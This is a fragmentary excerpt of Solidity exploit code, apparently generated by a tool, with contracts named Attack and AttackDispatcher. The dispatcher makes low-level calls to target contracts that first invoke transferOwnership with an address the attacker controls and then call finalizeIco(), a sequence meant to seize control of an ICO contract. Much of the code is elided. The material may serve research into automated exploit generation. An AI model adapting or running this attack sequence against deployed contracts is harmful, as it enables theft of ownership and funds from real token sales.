...
contract AttackDispatcher {
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                /*  func: transferOwnership(address) (0xf2fde38b)
                input: { address(0xc2018c3f08417e77b94fb541fed2bf1e09093edd),  }
 
                 */
                bytes memory data = abi.encodePacked(hex"f2fde38b000000000000000000000000", (manager.__id_to_address(2)));
                uint value = 0x0;
            ...
            if (id == 2) {
                /*  func: finalizeIco() (0x903a3ef6)
                input: {  }
 
                 */
                bytes memory data = bytes(hex"903a3ef6");
                uint value = 0x0;
                address payable target = payable(targets[0 % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
...
contract Attack is AttackManager {
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        subs[2] = new AttackDispatcher{value: 0 }(2, _targets);
    }
